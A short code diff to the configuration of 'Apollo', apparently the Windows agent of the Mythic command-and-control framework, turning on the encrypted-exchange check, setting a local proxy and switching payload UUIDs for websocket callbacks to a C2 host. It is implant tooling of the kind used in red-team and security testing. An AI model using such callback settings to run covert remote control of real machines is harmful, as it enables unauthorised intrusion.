@@ -83,9 +83,9 @@ namespace Apollo
                         { "callback_port", "8081" },
                         { "callback_host", "ws://mythic" },
                         { "post_uri", "socket" },
-                        { "encrypted_exchange_check", "F" },
-                        { "proxy_host", "" },
-                        { "proxy_port", "" },
+                        { "encrypted_exchange_check", "T" },
+                        { "proxy_host", "127.0.0.1" },
+                        { "proxy_port", "8080" },
                         { "proxy_user", "" },
                         { "proxy_pass", "" },
                         { "domain_front", "domain_front" },
@@ -163,8 +163,8 @@ namespace Apollo
 #if HTTP
         public static string PayloadUUID = "89d28526-e957-4142-b0fe-b672b397179f";
 #elif WEBSOCKET
-        public static string PayloadUUID = "02ec9661-5b31-41fb-982d-3626906dd4b6"; // no encryption and no keyx 
-        //public static string PayloadUUID = "09db8fec-be7b-4e33-8fe1-fb0c84d591e5"; // no encryption but yes keyx
+        //public static string PayloadUUID = "02ec9661-5b31-41fb-982d-3626906dd4b6"; // no encryption and no keyx 
+        public static string PayloadUUID = "09db8fec-be7b-4e33-8fe1-fb0c84d591e5"; // no encryption but yes keyx
         //public static string PayloadUUID = "02ec9661-5b31-41fb-982d-3626906dd4b6"; // yes encryption but no keyx
         //public static string PayloadUUID = "02ec9661-5b31-41fb-982d-3626906dd4b6"; // yes encryption and yes keyx
 #elif SMB
